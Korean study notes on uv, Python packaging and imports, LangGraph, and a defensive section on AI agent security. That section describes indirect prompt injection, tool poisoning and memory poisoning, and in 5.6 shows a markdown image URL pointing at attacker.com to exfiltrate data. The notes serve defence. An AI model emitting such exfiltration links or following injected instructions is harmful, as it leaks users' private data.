# 수업 노트 정리: uv · 파이썬 패키지 · LangGraph · 에이전트 보안

## 목차

1. [uv로 파이썬 환경 관리하기](#1-uv로-파이썬-환경-관리하기)
2. [파이썬 패키지 구조와 import](#2-파이썬-패키지-구조와-import)
3. [LangGraph](#3-langgraph)
4. [에이전트 설계 패턴](#4-에이전트-설계-패턴)
5. [AI 에이전트 보안](#5-ai-에이전트-보안)
6. [기타: Jira 용어](#6-기타-jira-용어)

---

## 1. uv로 파이썬 환경 관리하기

uv는 **venv(가상환경 생성) + pip(패키지 설치)** 를 한 도구로 처리하며, 속도가 훨씬 빠르다.

### 1.1 두 가지 사용 방식

**pip 호환 모드** — 기존 명령 앞에 `uv`만 붙인다.

```bash
uv venv                             # python -m venv .venv
uv pip install requests             # pip install requests
uv pip install -r requirements.txt
```

**프로젝트 방식 (권장)** — `.venv`를 직접 만들 필요 없이 `uv add` / `uv sync` 때 자동 생성된다.

```bash
uv init myproject     # 프로젝트 생성 (pyproject.toml)
uv add requests       # 설치 + pyproject.toml에 의존성 기록
uv sync               # uv.lock 기준으로 환경 맞추기
```

### 1.2 activate 대신 `uv run`

```bash
uv run python main.py
uv run pytest
```

- 실행 전에 의존성을 확인하고 필요하면 자동 동기화한다.
- "activate 깜빡하고 전역 파이썬에 설치" 같은 실수를 막아준다.
- uv가 만든 `.venv`도 일반 가상환경이므로 기존 activate도 그대로 동작한다.

```bash
source .venv/bin/activate    # macOS/Linux
.venv\Scripts\activate       # Windows
```

### 1.3 기존 방식과의 대응표

| 기존 | uv |
| --- | --- |
| `python -m venv .venv` | `uv venv` (또는 `uv sync` 시 자동 생성) |
| `pip install X` | `uv add X` / `uv pip install X` |
| `pip install -r requirements.txt` | `uv sync` / `uv pip install -r ...` |
| `source .venv/bin/activate` 후 `python ...` | `uv run python ...` |

### 1.4 pyproject.toml vs uv.lock

- **pyproject.toml** = "내가 원하는 것" (사람이 읽고 수정)
- **uv.lock** = "실제로 설치된 정확한 결과" (uv가 관리, **직접 수정 금지**)

**pyproject.toml 예시**

```toml
[project]
name = "myproject"
version = "0.1.0"
description = "Add your description here"
readme = "README.md"
requires-python = ">=3.12"
dependencies = [
    "requests>=2.32.3",
    "fastapi>=0.115.0",
]

[dependency-groups]
dev = [
    "pytest>=8.3.0",
]
```

- 파이썬 공식 표준 형식이라 poetry, pip 등 다른 도구도 읽을 수 있다.
- `dependencies`: `uv add`로 추가한 **직접 쓰는 패키지만**, 버전은 **범위**로 기록.
- 개발용 의존성: `uv add --dev pytest` → `dev` 그룹에 들어간다.
- `[tool.ruff]` 같은 도구 설정도 이 파일 하나에 모을 수 있다.
- ⚠️ `version`은 직접 바꿔야 한다. 안 바꾸면 그대로 남는다.
- `requires-python`에 사용 가능한 파이썬 버전 범위가 나와 있다.

**uv.lock 예시**

```toml
[[package]]
name = "requests"
version = "2.32.3"
source = { registry = "https://pypi.org/simple" }
dependencies = [
    { name = "certifi" },
    { name = "charset-normalizer" },
    { name = "idna" },
    { name = "urllib3" },
]
sdist = { url = "...", hash = "sha256:55365417..." }
wheels = [
    { url = "...", hash = "sha256:70761cfe..." },
]
```

- 모든 패키지의 **정확한 버전**(범위가 아닌 단일 버전)
- **간접 의존성까지 전부** 기록
- **해시값**으로 다운로드 파일 변조 여부 검증
- 여러 OS / 파이썬 버전 대응 정보 포함

→ 다른 사람이 `uv sync`만 하면 **완전히 똑같은 환경**이 만들어진다.

**requirements.txt와 비교:** 손으로 쓰면 사람마다 다른 버전이 설치되고, `pip freeze`로 뽑으면 직접 쓰는 패키지와 딸려온 패키지가 구분되지 않는다. uv는 이 두 역할을 두 파일로 분리했다.

**같이 생기는 파일**

- `.python-version`: 프로젝트에서 쓸 파이썬 버전 (예: `3.12`)
- `.venv/`: 실제 가상환경 폴더. 언제든 `uv sync`로 재생성 가능

**git 커밋 대상**

| 파일 | 커밋 |
| --- | --- |
| pyproject.toml | O |
| uv.lock | O (재현성의 핵심) |
| .python-version | O |
| .venv/ | X (`.gitignore`에 추가, `uv init` 시 기본 포함) |

### 1.5 requirements.txt가 필요한가?

uv 프로젝트 안에서만 작업하면 **필요 없다.** 단, pip만 쓰는 동료/서버, requirements.txt를 요구하는 배포 플랫폼·Dockerfile·CI가 있으면 uv.lock에서 뽑아낸다.

```bash
uv export -o requirements.txt
uv export --no-hashes -o requirements.txt   # 해시값 제외
uv export --no-dev -o requirements.txt      # 개발용 제외 (배포용)
```

- 의존성을 바꿀 때마다 다시 export해야 하므로, 꼭 필요할 때만 만든다.

**반대로, 기존 requirements.txt를 uv 프로젝트로 옮길 때**

```bash
uv add -r requirements.txt
uv add -r pre-requirements.txt   # 수업에서 사용한 명령
```

pyproject.toml에 의존성이 추가되고 uv.lock도 함께 생성된다.

### 1.6 파이썬 버전 지정

```bash
uv python pin 3.12               # 1. 프로젝트 기본 버전 고정 (가장 많이 씀) → .python-version 생성
uv init --python 3.12 myproject  # 2. 프로젝트 생성 시 지정
uv venv --python 3.12            # 3. 가상환경 생성 시 지정
uv run --python 3.11 script.py   # 4. 일회성 실행 시 지정
uv python install 3.12           # 5. 특정 버전 설치
uv python list                   #    설치됨/설치 가능한 버전 확인
```

- 필요한 버전이 없으면 uv가 자동으로 내려받는다.
- `requires-python`은 **허용 범위**, 실제 사용 버전은 `.python-version`이 결정한다. 둘이 충돌하지 않게 맞춘다.

### 1.7 conda와 uv를 같이 쓰면 생기는 일

`conda activate langgraph` → `uv sync` 순서로 실행하면:

1. conda `langgraph` 환경(Python 3.12)이 활성화된다. 이 시점엔 비어 있다.
2. `uv sync`는 **켜진 conda 환경을 무시하고** `pyproject.toml`이 있는 저장소 루트에 `.venv`를 만들어 거기에 설치한다.
   - conda의 Python을 `.venv`의 기반으로 쓸 수는 있지만, 패키지는 `.venv`에 들어간다.
   - 하위 폴더에서 실행해도 상위의 `pyproject.toml`을 찾으므로 `.venv`는 루트에 하나만 생긴다.
3. 결과: 프롬프트엔 `(langgraph)`가 보이지만 패키지는 `.venv`에 있어 `ModuleNotFoundError`가 나거나 명령을 못 찾는다.
   - `.venv\Scripts\activate`를 해야 PATH 맨 앞에 `.venv`가 와서 그 Python이 쓰인다.

**`uv pip`는 동작이 다르다:** 활성화된 venv → 활성화된 conda 환경 → 현재 폴더 `.venv` 순으로 찾아 설치한다. 반면 `uv sync` / `uv run`은 **항상 프로젝트의 `.venv`** 를 쓴다.

**→ 둘 중 하나만 고른다.**

```bash
# A. conda 방식
conda activate langgraph
pip install -r requirements.txt      # 또는 uv pip install -e .

# B. uv 방식
conda deactivate
uv sync
.venv\Scripts\activate               # 또는 uv run langgraph dev
```

**지금 어떤 Python이 쓰이는지 확인**

```bash
python -c "import sys; print(sys.executable)"
```

경로에 `envs\langgraph`가 있으면 conda, `.venv`가 있으면 uv 환경. Jupyter 커널도 같은 환경으로 선택해야 한다. uv로 정했다면 `conda env remove -n langgraph`로 conda 환경을 지워도 된다.

### 1.8 책 예제 실행 시 주의

- 책 예제는 zip으로 다운로드하는 게 편하다.
- IT 라이브러리는 사용법이 자주 바뀌어, 책 코드를 그대로 돌리면 안 될 가능성이 높다.
- → 예제 저장소에 lock 파일이 있으면 `uv sync`로 책과 같은 버전 환경을 재현할 수 있다.

---

## 2. 파이썬 패키지 구조와 import

### 2.1 프로젝트 구조와 진입점

uv로 환경을 구축한 뒤 `src/` 아래에 패키지 디렉터리를 만든다.

```
src/
└── ex1001/
    ├── __init__.py     # 패키지 초기화 (진입점 노출)
    ├── app.py
    └── __pycache__/    # 바이트코드 캐시 (자동 생성)
```

`src/ex1001/__init__.py`

```python
from .app import main
__all__ = ["main"]
```

- `__init__.py`: 패키지가 import될 때 실행되며 패키지를 초기화한다.
- `__all__`: `from ex1001 import *` 시 공개할 이름 목록.

### 2.2 import = 파일 실행

`import X` 시 파이썬이 하는 일:

1. **캐시 확인**: `sys.modules`에 이미 있으면 그대로 꺼내 쓰고 끝
2. **파일 찾기**
3. **빈 모듈 객체 생성 후 `sys.modules`에 등록**
4. **파일의 최상위 코드를 위에서 아래로 전부 실행** ← `print()` 등이 여기서 실행됨
5. **이름 연결**

```python
from .page86 import page86_ai_msg   # ① app.py 로드 시 page86.py 전체 실행 후 함수만 가져옴

def main() -> None:
    ...
    from . import page95            # ② main() 호출 시 page95.py 전체 실행, page95는 지역 변수
```

- `from A import B`도 **A 파일 전체가 실행**된다. B만 골라 실행하는 방법은 없다.
- 같은 모듈은 **최초 1회만** 실행된다 (`sys.modules` 캐시).

```python
main()   # page95.py의 print가 출력됨
main()   # 출력 안 됨
```

### 2.3 권장 방식: import는 준비, 실행은 함수 호출로

```python
# page95.py
def run():
    print("page95 실행")

if __name__ == "__main__":   # 직접 실행할 때만 동작
    run()
```

```python
# app.py
from .page86 import page86_ai_msg
from . import page95          # import해도 아무것도 출력되지 않음

def main() -> None:
    ...
    page95.run()              # 원할 때마다 실행
```

`__name__`은 직접 실행 시 `"__main__"`, import 시 `"패키지명.page95"`가 된다.

### 2.4 상대 import 주의

`from . import ...`는 **패키지의 일부로 실행될 때만** 동작한다.

```bash
python app.py              # ImportError: attempted relative import with no known parent package
python -m 패키지명.app      # 정상
```

---

## 3. LangGraph

### 3.1 개요

LangChain 팀이 만든 오픈소스 라이브러리. LLM 기반 에이전트와 워크플로를 **그래프(노드와 엣지)** 로 설계·실행한다. Python, JS/TS 지원.

**등장 배경:** LangChain의 "체인"은 A → B → C 단방향이라, "도구 호출 → 결과 확인 → 재판단 → 재호출" 같은 **루프**나 **조건 분기** 표현이 불편했다.

### 3.2 핵심 개념

- **State(상태)**: 그래프 전체가 공유하는 데이터 (예: 메시지 목록). 각 단계가 읽고 업데이트한다.
- **Node(노드)**: 작업 단위 (LLM 호출, 도구 실행, 일반 함수).
- **Edge(엣지)**: 노드 간 연결. **조건부 엣지**로 분기 가능.
- **사이클 지원**: 이전 노드로 돌아갈 수 있어 에이전트 루프 구현이 자연스럽다.

### 3.3 주요 강점

- **체크포인트/영속성**: 상태 저장 → 중단 후 재개, 대화 기억 유지
- **Human-in-the-loop**: 특정 단계에서 사람의 승인/수정
- **스트리밍**: 토큰/단계 단위 실시간 출력
- **멀티 에이전트**: 여러 에이전트를 노드로 두고 협업·위임

### 3.4 예시

```python
from langgraph.graph import StateGraph, MessagesState, START, END

def call_model(state: MessagesState):
    response = llm.invoke(state["messages"])
    return {"messages": [response]}

def should_continue(state: MessagesState):
    last = state["messages"][-1]
    return "tools" if last.tool_calls else END

graph = StateGraph(MessagesState)
graph.add_node("agent", call_model)
graph.add_node("tools", tool_node)
graph.add_edge(START, "agent")
graph.add_conditional_edges("agent", should_continue)
graph.add_edge("tools", "agent")   # 도구 실행 후 다시 에이전트로 → 루프
app = graph.compile()
```

### 3.5 LangChain과의 관계

- LangChain = **부품 모음** (모델·도구 연동)
- LangGraph = 부품을 어떤 순서·조건으로 돌릴지 정하는 **오케스트레이션 레이어**
- 단독 사용도 가능하지만 함께 쓰는 경우가 많다.
- 유사 도구: CrewAI, AutoGen, OpenAI Agents SDK, Claude Agent SDK. LangGraph는 추상화가 낮아 흐름을 세밀하게 통제할 때 선택된다.
- API가 자주 바뀌므로 공식 문서를 함께 확인할 것.

### 3.6 리듀서(Reducer)

**리듀서 = 노드가 반환한 새 값을 기존 상태와 어떻게 합칠지 정하는 함수.**

**이름의 의미:** reduce는 "감소"가 아니라 **"여러 개를 하나로 졸이다"** (소스를 졸이다, 분수를 약분하다).

함수형 프로그래밍의 `reduce`(fold):

```python
from functools import reduce
reduce(lambda acc, x: acc + x, [1, 2, 3, 4])   # → 10
# acc=1, x=2 → 3
# acc=3, x=3 → 6
# acc=6, x=4 → 10
```

`(누적값, 새 값) → 새 누적값` 모양의 함수가 리듀서.

**그래프 상태에 적용:** 현재 상태 = 초기 상태에 노드 업데이트들을 차례로 합쳐 졸여낸 결과.

```python
from typing import Annotated, TypedDict
import operator

class State(TypedDict):
    count: int                              # 리듀서 없음 → 덮어쓰기
    logs: Annotated[list, operator.add]     # 리듀서 = 리스트 이어붙이기
```

- `count`: 노드가 `5`를 반환하면 기존 값이 `5`로 **교체**
- `logs`: 기존 `["a"]` + 반환 `["b"]` → `["a", "b"]`로 **누적**
- 채팅 메시지처럼 덮어쓰면 안 되는 상태에 리듀서를 지정한다.
- 참고: 프론트엔드 Redux의 `(state, action) → 새 state` 함수도 같은 이유로 리듀서라 부른다.

---

## 4. 에이전트 설계 패턴

수업에서 다룬 주제 (세부 내용은 추가 학습 필요).

- **ReAct (Reasoning + Acting)**: 모델이 추론(생각)과 행동(도구 호출)을 번갈아 수행하고, 관찰 결과를 다음 추론에 반영하는 패턴.
- **Reflection**: 에이전트가 자신의 출력을 스스로 평가·비판하고 그 결과로 다시 개선하는 패턴.
- **Chroma DB 해시**: 관련 언급이 있었음 (필기 내용 미기록).

---

## 5. AI 에이전트 보안

핵심 전제: **LLM이 읽는 모든 외부 콘텐츠가 명령처럼 작동할 수 있다.**

### 5.1 프롬프트 인젝션 (가장 중요)

- **직접 인젝션**: 사용자가 시스템 프롬프트를 우회하려는 공격
- **간접 인젝션**: 웹페이지, 메일, 문서, 도구 결과 등에 숨긴 지시를 에이전트가 따르는 공격 — 에이전트에서 훨씬 위험
- 완벽한 방어책은 없다. "모델이 속을 수 있다"는 전제로 설계한다. 시스템 프롬프트에 "무시하라"고 적는 것만으로는 방어가 안 된다.

### 5.2 "치명적 삼박자" 피하기

아래 세 가지가 한 에이전트에 동시에 있으면 유출 위험이 크다.

1. 민감한 데이터 접근 (사내 문서, 메일, DB)
2. 신뢰할 수 없는 콘텐츠 노출 (웹, 외부 메일, 업로드)
3. 외부로 정보를 보낼 수단 (HTTP 요청, 메일 발송, 링크/이미지 렌더링)

→ **셋 중 하나를 끊는 것**이 가장 확실한 방어 (예: 외부 웹을 읽는 에이전트는 사내 데이터 차단, 네트워크 송신을 allowlist로 제한).

### 5.3 최소 권한과 인증

- 도구별 권한을 좁게. 기본은 읽기 전용, 쓰기·삭제는 별도 허용
- 공용 관리자 키 대신 **실제 사용자 권한으로 동작** (OAuth 스코프) → confused deputy 방지
- 토큰은 짧은 수명·좁은 범위로. API 키·비밀번호는 프롬프트에 넣지 않는다. 시스템 프롬프트는 유출된다고 가정

### 5.4 위험한 행동은 사람의 승인

- 결제, 송금, 메일 발송, 삭제, 배포, 권한 변경 등은 실행 전 확인
- 승인 화면에 "무엇을, 어디에, 어떤 값으로" 구체적으로 표시 → 습관적 승인 방지

### 5.5 코드 실행 샌드박싱

- 격리된 컨테이너/VM에서 실행
- 네트워크 송신, 파일시스템 범위, CPU·메모리·시간 제한
- 호스트 자격 증명·환경 변수 노출 금지

### 5.6 LLM 출력을 신뢰하지 않기

- 모델이 만든 SQL, 셸 명령, 파일 경로, HTML, URL은 사용자 입력처럼 검증 (SQL 인젝션, 명령어 인젝션, 경로 탐색, XSS)
- 마크다운 이미지/링크 자동 렌더링은 유출 경로가 될 수 있다: `![](https://attacker.com/?data=...)`

### 5.7 공급망: 도구, MCP 서버, 플러그인

- 서드파티 MCP 서버·플러그인은 코드 의존성처럼 검증
- 도구 설명문에 악성 지시가 숨을 수 있다 (tool poisoning). 업데이트 후 바뀔 수 있으니 버전 고정·변경 감지
- 모델이 지어낸 패키지명을 공격자가 선점할 수 있다. 설치 전 실존·출처 확인

### 5.8 메모리와 RAG 오염

- 장기 메모리·벡터 DB에 악성 내용이 저장되면 이후 모든 세션에 영향
- 쓰기 시점 통제, 출처 기록, 사용자가 확인·삭제 가능하게
- 멀티테넌트 환경에서 사용자 간 데이터 격리

### 5.9 멀티 에이전트 간 신뢰

- 다른 에이전트의 메시지도 신뢰할 수 없는 입력으로 취급
- 하위 에이전트가 상위보다 많은 권한을 갖지 않게

### 5.10 관측성과 운영

- 모든 도구 호출을 입력·출력·실행 주체와 함께 감사 로그로 기록
- 단계 수, 토큰, 비용 상한과 rate limit
- 비정상 패턴 (대량 조회, 낯선 도메인 요청) 모니터링

### 5.11 테스트와 레드팀

- 간접 인젝션 시나리오를 평가 세트로 만들어 회귀 테스트 (예: 숨은 지시가 담긴 문서를 요약시키기)
- 모델·프롬프트 변경 시마다 재실행

**참고 자료:** OWASP *Top 10 for LLM Applications*, Agentic Security Initiative 가이드 (최신판 확인)

---

## 6. 기타: Jira 용어

| 단위 | 설명 | 예전 이름 |
| --- | --- | --- |
| 사이트(site) | 조직 전체의 Jira (`회사이름.atlassian.net`). 초대는 보통 여기에 받음 | - |
| 스페이스(space) | 팀·업무별 작업 공간 | 프로젝트 |
| 작업 항목(work item) | 스페이스 안의 개별 할 일 | 이슈(issue) |

→ "회사 Jira **사이트**에 초대받고, 그 안의 **스페이스**(프로젝트)에서 **작업 항목**(이슈)을 처리한다."
